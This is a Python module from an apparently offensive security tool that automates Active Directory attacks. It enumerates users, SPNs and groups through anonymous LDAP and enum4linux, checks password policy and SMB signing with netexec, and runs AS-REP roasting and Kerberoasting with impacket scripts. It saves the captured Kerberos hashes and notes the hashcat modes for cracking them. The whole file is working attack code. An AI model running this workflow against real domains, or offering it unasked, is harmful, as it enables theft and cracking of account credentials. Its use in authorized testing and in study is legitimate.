"""
BBR – Active Directory Module
Runs only when AD signature ports are detected (88, 389, 3268).

Techniques:
  • enum4linux / enum4linux-ng  – domain/user/share/policy enum
  • ldapsearch                  – user, group, SPN, trust enumeration
  • rpcclient                   – SID/user enumeration
  • AS-REP Roasting             – GetNPUsers.py (no pre-auth required accounts)
  • Kerberoasting               – GetUserSPNs.py (service principal names)
  • Password policy             – via netexec
  • SMB signing                 – via netexec
  • Null session                – check for anonymous LDAP
"""

import subprocess
import shutil
import re
from pathlib import Path
from typing import Any, Dict, Optional

from rich.console import Console

console = Console()

ORANGE = "bold #B44A1A"
STEEL  = "#A8B2C0"

AD_PORTS = {88, 389, 636, 3268, 3269}

# Impacket examples location on Kali
IMPACKET_EXAMPLES = Path("/usr/share/doc/python3-impacket/examples")


def _tool(name: str) -> bool:
    return shutil.which(name) is not None


def _impacket_script(name: str) -> Optional[str]:
    """Return path to an impacket example script or None."""
    # Check /usr/share/doc path (Kali default package install)
    p = IMPACKET_EXAMPLES / name
    if p.exists():
        return str(p)
    # Fall back to which (installed via pip as console_scripts)
    stem = name.replace(".py", "")
    if shutil.which(f"impacket-{stem}"):
        return f"impacket-{stem}"
    if shutil.which(stem):
        return stem
    return None


def _run(cmd: list, label: str, out_file: Path, timeout: int = 120, verbose: bool = False) -> str:
    if verbose:
        console.print(f"    [dim]CMD: {' '.join(cmd)}[/dim]")
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
        )
        output = (result.stdout + ("\n" + result.stderr if result.stderr.strip() else "")).strip()
        if out_file:
            out_file.parent.mkdir(parents=True, exist_ok=True)
            out_file.write_text(output)
        return output
    except subprocess.TimeoutExpired:
        msg = f"[timed out after {timeout}s]"
        if out_file:
            out_file.write_text(msg)
        return msg
    except FileNotFoundError:
        return f"[tool not found: {cmd[0]}]"


class ADModule:
    def __init__(self, output_dir: str, verbose: bool = False):
        self.output_dir = Path(output_dir) / "ad"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.verbose    = verbose

    @staticmethod
    def is_domain_controller(open_ports: set) -> bool:
        """Return True if AD-signature ports are present."""
        return bool(open_ports & AD_PORTS)

    def run(self, host: str, open_ports: set, enum_data: dict) -> Dict[str, Any]:
        """Full AD enumeration against `host`."""
        console.print(f"\n  [{ORANGE}][AD][/{ORANGE}]  {host}  [{STEEL}]Active Directory enumeration[/{STEEL}]")

        results: Dict[str, Any] = {
            "host":   host,
            "domain": None,
            "users":  [],
            "groups": [],
            "spns":   [],
            "asrep":  [],
            "kerberoast_hashes": [],
            "asrep_hashes":      [],
            "smb_signing": None,
            "password_policy": None,
            "notes":  [],
        }

        # ── 1. enum4linux ──────────────────────────────────────────────────
        domain = self._enum4linux(host, results)

        # ── 2. LDAP enumeration ────────────────────────────────────────────
        self._ldap_enum(host, results)

        # ── 3. Password policy + SMB signing via netexec ───────────────────
        self._netexec_info(host, results)

        # ── 4. AS-REP Roasting ─────────────────────────────────────────────
        if results.get("domain") or results.get("users"):
            domain_str = results.get("domain") or ""
            user_list  = results.get("users", [])
            self._asrep_roast(host, domain_str, user_list, results)

        # ── 5. Kerberoasting (requires creds – try null) ───────────────────
            self._kerberoast(host, domain_str, results)

        return results

    # ── enum4linux ────────────────────────────────────────────────────────────

    def _enum4linux(self, host: str, results: dict) -> str:
        # Prefer enum4linux-ng (better output, maintained)
        if _tool("enum4linux-ng"):
            raw = _run(
                ["enum4linux-ng", "-A", "-oJ",
                 str(self.output_dir / f"enum4linux_{host}.json"), host],
                f"enum4linux-ng {host}",
                self.output_dir / f"enum4linux_{host}.txt",
                timeout=180,
                verbose=self.verbose,
            )
        elif _tool("enum4linux"):
            raw = _run(
                ["enum4linux", "-a", host],
                f"enum4linux {host}",
                self.output_dir / f"enum4linux_{host}.txt",
                timeout=180,
                verbose=self.verbose,
            )
        else:
            results["notes"].append("enum4linux not available")
            return ""

        # Parse domain name
        for line in raw.splitlines():
            m = re.search(r"Domain Name[:\s]+(\S+)", line, re.IGNORECASE)
            if m:
                results["domain"] = m.group(1).strip()
            m2 = re.search(r"user:\[([^\]]+)\]", line)
            if m2:
                uname = m2.group(1).strip()
                if uname not in results["users"]:
                    results["users"].append(uname)

        console.print(
            f"    [{STEEL}]Domain: {results.get('domain','unknown')}  "
            f"Users found: {len(results['users'])}[/{STEEL}]"
        )
        return results.get("domain", "")

    # ── LDAP ──────────────────────────────────────────────────────────────────

    def _ldap_enum(self, host: str, results: dict):
        # Null-bind base query to get naming context
        base_raw = _run(
            ["ldapsearch", "-x", "-H", f"ldap://{host}", "-b", "", "-s", "base",
             "namingContexts", "defaultNamingContext"],
            "ldapsearch base",
            self.output_dir / f"ldap_base_{host}.txt",
            timeout=15,
            verbose=self.verbose,
        )

        nc = ""
        for line in base_raw.splitlines():
            if line.lower().startswith("defaultnamingcontext:"):
                nc = line.split(":", 1)[1].strip()
                break
            if not nc and line.lower().startswith("namingcontexts:"):
                nc = line.split(":", 1)[1].strip()

        if not nc:
            results["notes"].append("LDAP null-bind: no naming context returned (auth may be required)")
            return

        results["ldap_nc"] = nc

        # Try to derive FQDN domain if not already set
        if not results.get("domain") and nc:
            parts = [p.split("=")[1] for p in nc.split(",") if p.strip().startswith("DC=")]
            if parts:
                results["domain"] = ".".join(parts)

        # User enumeration
        users_raw = _run(
            ["ldapsearch", "-x", "-H", f"ldap://{host}", "-b", nc,
             "(objectClass=user)",
             "sAMAccountName", "userPrincipalName", "mail",
             "userAccountControl", "memberOf"],
            "ldapsearch users",
            self.output_dir / f"ldap_users_{host}.txt",
            timeout=30,
            verbose=self.verbose,
        )
        for line in users_raw.splitlines():
            if line.lower().startswith("samaccountname:"):
                uname = line.split(":", 1)[1].strip()
                if uname not in results["users"] and "$" not in uname:
                    results["users"].append(uname)

        # SPN enumeration (Kerberoastable accounts)
        spn_raw = _run(
            ["ldapsearch", "-x", "-H", f"ldap://{host}", "-b", nc,
             "(&(objectClass=user)(servicePrincipalName=*))",
             "sAMAccountName", "servicePrincipalName"],
            "ldapsearch SPNs",
            self.output_dir / f"ldap_spns_{host}.txt",
            timeout=30,
            verbose=self.verbose,
        )
        for line in spn_raw.splitlines():
            if line.lower().startswith("serviceprincipalname:"):
                spn = line.split(":", 1)[1].strip()
                if spn not in results["spns"]:
                    results["spns"].append(spn)

        # Groups
        groups_raw = _run(
            ["ldapsearch", "-x", "-H", f"ldap://{host}", "-b", nc,
             "(objectClass=group)", "cn", "member"],
            "ldapsearch groups",
            self.output_dir / f"ldap_groups_{host}.txt",
            timeout=30,
            verbose=self.verbose,
        )
        for line in groups_raw.splitlines():
            if line.lower().startswith("cn:"):
                gname = line.split(":", 1)[1].strip()
                if gname not in results["groups"]:
                    results["groups"].append(gname)

        console.print(
            f"    [{STEEL}]LDAP: {len(results['users'])} users  "
            f"{len(results['spns'])} SPNs  "
            f"{len(results['groups'])} groups[/{STEEL}]"
        )

    # ── netexec info ──────────────────────────────────────────────────────────

    def _netexec_info(self, host: str, results: dict):
        for tool in ("netexec", "nxc"):
            if not _tool(tool):
                continue
            raw = _run(
                [tool, "smb", host, "--pass-pol", "-u", "", "-p", ""],
                "netexec pass policy",
                self.output_dir / f"passpol_{host}.txt",
                timeout=30,
                verbose=self.verbose,
            )
            results["password_policy"] = raw

            raw2 = _run(
                [tool, "smb", host],
                "netexec smb info",
                self.output_dir / f"smb_info_{host}.txt",
                timeout=20,
                verbose=self.verbose,
            )
            # Extract signing info
            for line in raw2.splitlines():
                if "signing" in line.lower():
                    results["smb_signing"] = line.strip()
                    break
            break

    # ── AS-REP Roasting ───────────────────────────────────────────────────────

    def _asrep_roast(self, host: str, domain: str, users: list, results: dict):
        if not domain:
            results["notes"].append("AS-REP roast skipped: no domain detected")
            return

        script = _impacket_script("GetNPUsers.py")
        if not script:
            results["notes"].append("AS-REP roast skipped: GetNPUsers.py not found")
            return

        out_file = self.output_dir / f"asrep_{host}.txt"

        # First try with user list file if we have users
        if users:
            users_file = self.output_dir / f"users_{host}.txt"
            users_file.write_text("\n".join(users))

            cmd = [
                "python3", script,
                f"{domain}/",
                "-dc-ip", host,
                "-no-pass",
                "-usersfile", str(users_file),
                "-format", "hashcat",
                "-outputfile", str(out_file),
            ]
        else:
            cmd = [
                "python3", script,
                f"{domain}/",
                "-dc-ip", host,
                "-no-pass",
                "-request",
                "-format", "hashcat",
                "-outputfile", str(out_file),
            ]

        raw = _run(cmd, "AS-REP roast", out_file, timeout=60, verbose=self.verbose)

        # Collect any hashes
        if out_file.exists():
            hashes = [l for l in out_file.read_text().splitlines() if l.startswith("$krb5asrep")]
            results["asrep_hashes"] = hashes
            if hashes:
                console.print(
                    f"    [{ORANGE}]AS-REP Roast: {len(hashes)} hash(es) captured![/{ORANGE}]"
                )
                results["notes"].append(f"AS-REP: {len(hashes)} vulnerable account(s) — crack with hashcat -m 18200")

    # ── Kerberoasting ─────────────────────────────────────────────────────────

    def _kerberoast(self, host: str, domain: str, results: dict):
        if not domain:
            results["notes"].append("Kerberoast skipped: no domain detected")
            return
        if not results.get("spns"):
            results["notes"].append("Kerberoast skipped: no SPNs found")
            return

        script = _impacket_script("GetUserSPNs.py")
        if not script:
            results["notes"].append("Kerberoast skipped: GetUserSPNs.py not found")
            return

        out_file = self.output_dir / f"kerberoast_{host}.txt"
        cmd = [
            "python3", script,
            f"{domain}/",
            "-dc-ip", host,
            "-no-pass",
            "-outputfile", str(out_file),
        ]
        raw = _run(cmd, "Kerberoast", out_file, timeout=60, verbose=self.verbose)

        if out_file.exists():
            hashes = [l for l in out_file.read_text().splitlines() if l.startswith("$krb5tgs")]
            results["kerberoast_hashes"] = hashes
            if hashes:
                console.print(
                    f"    [{ORANGE}]Kerberoast: {len(hashes)} TGS hash(es) captured![/{ORANGE}]"
                )
                results["notes"].append(f"Kerberoast: {len(hashes)} TGS hash(es) — crack with hashcat -m 13100")
        elif raw and "error" not in raw.lower():
            results["notes"].append(f"Kerberoast (null creds): {raw[:200]}")
